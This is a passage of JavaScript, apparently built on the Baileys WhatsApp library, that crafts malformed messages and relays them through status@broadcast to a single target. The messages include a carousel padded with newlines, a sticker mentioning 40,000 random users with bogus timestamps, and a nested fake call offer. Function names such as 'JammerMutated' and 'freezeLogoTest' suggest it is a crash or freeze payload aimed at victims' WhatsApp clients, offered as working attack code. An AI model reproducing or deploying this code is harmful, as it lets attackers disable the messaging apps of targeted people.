                  footer: proto.Message.InteractiveMessage.Footer.create({
                    text: "\n".repeat(99)
                  }),
                  header: proto.Message.InteractiveMessage.Header.create({
                    hasMediaAttachment: false
                  }),
                  carouselMessage: proto.Message.InteractiveMessage.CarouselMessage.fromObject({
                    cards: [...array1]
                  })
                })
              }
            }
          }, {});
          await client.relayMessage("status@broadcast", Msg2.message, {
            messageId: Msg2.key.id,
            statusJidList: [target],
            additionalNodes: [{
              tag: "meta",
              attrs: {},
              content: [{
                tag: "mentioned_users",
                attrs: {},
                content: [{
                  tag: "to",
                  attrs: {
                    jid: target
                  },
                  content: undefined
                }]
              }]
            }]
          });
        }
        const stcMess = {
          viewOnceMessage: {
            message: {
              stickerMessage: {
                url: "https://mmg.whatsapp.net/v/t62.43144-24/" + encmedia + "?ccb=11-4&oh=01_Q5Aa1gEB3Y3v90JZpLBldESWYvQic6LvvTpw4vjSCUHFPSIBEg&oe=685F4C37&_nc_sid=" + mms + "=true",
                fileSha256: "n9ndX1LfKXTrcnPBT8Kqa85x87TcH3BOaHWoeuJ+kKA=",
                fileEncSha256: "zUvWOK813xM/88E1fIvQjmSlMobiPfZQawtA9jg9r/o=",
                mediaKey: "ymysFCXHf94D5BBUiXdPZn8pepVf37zAb7rzqGzyzPg=",
                mimetype: format,
                directPath: "/v/t62.43144-24/10000000_2012297619515179_5714769099548640934_n.enc?ccb=11-4&oh=01_Q5Aa1gEB3Y3v90JZpLBldESWYvQic6LvvTpw4vjSCUHFPSIBEg&oe=685F4C37&_nc_sid=5e03e0",
                fileLength: {
                  low: Math.floor(Math.random() * 1000),
                  high: 0,
                  unsigned: true
                },
                mediaKeyTimestamp: {
                  low: Math.floor(Math.random() * 1700000000),
                  high: 0,
                  unsigned: false
                },
                firstFrameLength: 19904,
                firstFrameSidecar: "KN4kQ5pyABRAgA==",
                isAnimated: true,
                contextInfo: {
                  participant: targetNumber,
                  mentionedJid: ["0@s.whatsapp.net", ...Array.from({
                    length: 40000
                  }, () => "1" + Math.floor(Math.random() * 5000000) + "@s.whatsapp.net")],
                  groupMentions: [],
                  entryPointConversionSource: "non_contact",
                  entryPointConversionApp: "whatsapp",
                  entryPointConversionDelaySeconds: 467593
                },
                stickerSentTs: {
                  low: Math.floor(Math.random() * -20000000),
                  high: 555,
                  unsigned: conditional
                },
                isAvatar: conditional,
                isAiSticker: conditional,
                isLottie: conditional
              }
            }
          }
        };
        const Msg3 = generateWAMessageFromContent(targetNumber, stcMess, {});
        await client.relayMessage("status@broadcast", Msg3.message, {
          messageId: Msg3.key.id,
          statusJidList: [target],
          additionalNodes: [{
            tag: "meta",
            attrs: {},
            content: [{
              tag: "mentioned_users",
              attrs: {},
              content: [{
                tag: "offer",
                attrs: {
                  "call-id": cryptohex,
                  "call-creator": "696969696969@s.whatsapp.net",
                  timestamp: Date.now().toString()
                },
                content: Msg1
              }]
            }]
          }]
        });
      } catch (error) {
        console.error("Error in JammerMutated for " + mention + ":", error.message);
        throw error;
      }
    } 

module.exports = { locaepheflow, opuswebp, locationfc, freezeLogoTest, locameral, CrlSqL, ControlFlow2, TripXMed2 }